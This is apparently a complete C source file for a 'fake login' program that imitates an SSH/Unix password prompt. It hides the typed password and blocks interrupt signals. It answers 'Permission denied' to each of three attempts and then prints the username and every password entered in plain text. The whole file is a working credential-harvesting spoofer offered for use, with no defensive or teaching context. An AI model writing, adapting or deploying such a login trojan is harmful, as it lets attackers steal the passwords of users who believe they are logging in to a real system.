/* login.c -- fake login program.
 * Author: Luis Colorado <luiscoloradourcola@gmail.com>
 * Date: Mon Dec 12 19:59:55 EET 2016
 * Disclaimer: (C) 2016 Luis Colorado.  All rights reserved.
 *
 * This program is open source according to the BSD license.
 * No warranty of use is granted.  You are on your own.
 * You can distribute this program in source or binary form,
 * assumed that you credit the author and respect the copyright
 * note.  This means you are expressely not allowed to change
 * this copyright notice, the author's name above and you 
 * commit to add a text note with this text to any binary
 * distribution you make of this program.  You can use this
 * program, edit, change, but always respecting the present
 * copyright notice.
 */
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>

#define F(x) __FILE__":%d:%s: " x, __LINE__, __func__

#define FLAG_RAW        (1)
#define N_TRIES         (3)

char *username = NULL;

char *vprompt(char *buffer, size_t sz, int flags, const char *fmt, va_list args)
{
    struct termios saved_tty;
    ssize_t n_read;

    vfprintf(stderr, fmt, args);
    if (flags & FLAG_RAW) {
        struct termios tty;
        tcgetattr(0, &saved_tty);
        tty = saved_tty;
        tty.c_lflag &= ~(ECHO);
        tcsetattr(0, TCSAFLUSH, &tty);
    }

    n_read = read(0, buffer, sz-1);
    if (flags & FLAG_RAW) {
        tcsetattr(0, TCSAFLUSH, &saved_tty);
        puts(""); fflush(stdout);
    }
    if (n_read < 0) {
        return NULL;
    }

    while(n_read > 0 && buffer[n_read-1] == '\n') n_read--;
    buffer[n_read] = 0;

    return buffer;
} /* vprompt */

char *prompt(char *buffer, size_t sz, int flags, const char *fmt, ...)
{
    char *res;
    va_list args;

    va_start(args, fmt);
    res = vprompt(buffer, sz, flags, fmt, args);
    va_end(args);

    return res;
} /* prompt */

int main(int argc, char **argv)
{
    char line[1024];
    int i = 0, res;
    char *pass[10];
    char *hostname;

    res = gethostname(line, sizeof line);
    if (res < 0) {
        fprintf(stderr,
                F("gethostname: %s (errno=%d)\n"),
                strerror(errno), errno);
        exit(EXIT_FAILURE);
    }

    hostname = strdup(line);

    switch(argc) {
    case 2: username = argv[1];
    case 1: break;
    default:
        fprintf(stderr, F("Usage: login [ user ]\n"));
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    do {
        static char slp[] = { 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, };
        if (!username) {
            do {
                prompt(line, sizeof line, 0, "login: ");
                username = strdup(line);
            } while (strcmp(username, "") == 0);
        }
        prompt(line, sizeof line, FLAG_RAW, "%s@%s's password: ",
                username, hostname);
        pass[i] = strdup(line);
        sleep(slp[i]);
        fprintf(stderr, "Permission denied, please try again\n");
    } while (++i < N_TRIES);

    fprintf(stderr, "Permission denied (publickey,password)\n");
    int n = i;
    printf("Usuario: %s\n", username);
    for (i = 0; i < n; i++) {
        printf("Password#%d: %s\n", i, pass[i]);
    }
} /* main */
